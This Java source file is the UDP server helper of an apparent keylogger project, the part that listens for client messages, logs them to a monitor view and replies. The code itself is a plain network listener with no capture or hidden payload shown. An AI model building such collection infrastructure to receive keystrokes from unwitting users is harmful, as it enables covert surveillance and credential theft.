package com.hao.keylogger.controllers.server;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.security.acl.LastOwnerException;

public class UDPServerHelper {

	private static UDPServerHelper instance;
	
	private ServerLogController controller;

	private DatagramSocket socket;
	private InetAddress address;
	private String hostName;
	private int port;

	private byte[] buffer = new byte[256];
	
	Thread listenThread;

	private UDPServerHelper(String hostName, int port) {
		this.hostName = hostName;
		this.port = port;
	}

	public static UDPServerHelper getInstance(String hostName, int port) {
		if (instance == null) {
			instance = new UDPServerHelper(hostName, port);
		}
		return instance;
	}

	public static String getLocalHostIP() {
		try {
			return InetAddress.getLocalHost().getHostAddress();
		} catch (UnknownHostException e) {
			e.printStackTrace();
			return null;
		}
	}

	public boolean startServer() {
		try {
			address = InetAddress.getByName(hostName);
			socket = new DatagramSocket(port, address);
			listenThread = new Thread(new PacketReceiver());
			listenThread.start();
			return true;
		} catch (SocketException | UnknownHostException e) {
			e.printStackTrace();
			return false;
		}

	}

	public boolean stopServer() {
		try {
			socket.close();
			return true;
		} catch (Exception e) {
			return false;
		}
	}

	public void setController(ServerLogController controller) {
		this.controller = controller;
	}

	public void startListenning() {
		// TODO làm đa luồng
		// DatagramPacket inPacket = new DatagramPacket(buffer, buffer.length);
		// try {
		// socket.receive(inPacket);
		// String inMsg = new String(inPacket.getData(), 0,
		// inPacket.getLength());
		// System.out.println(inMsg);
		// }
		// catch (Exception e) {
		//
		// }

	}
	
	private class PacketReceiver implements Runnable {
		@Override
		public void run() {
			while (true) {
				System.out.println("listening");
				DatagramPacket inPacket = new DatagramPacket(buffer, buffer.length);
				try {
					socket.receive(inPacket);
					String inMsg = new String(inPacket.getData(), 0, inPacket.getLength());
					controller.appendToMonitory("Client: " + inMsg);
					String retMsg = "Hi client, gotcha!"; 
					DatagramPacket outPacket = new DatagramPacket(retMsg.getBytes(), retMsg.length(), inPacket.getAddress(), inPacket.getPort());
					socket.send(outPacket);
				} catch (Exception e) {

				}
			}
		}
	}

}
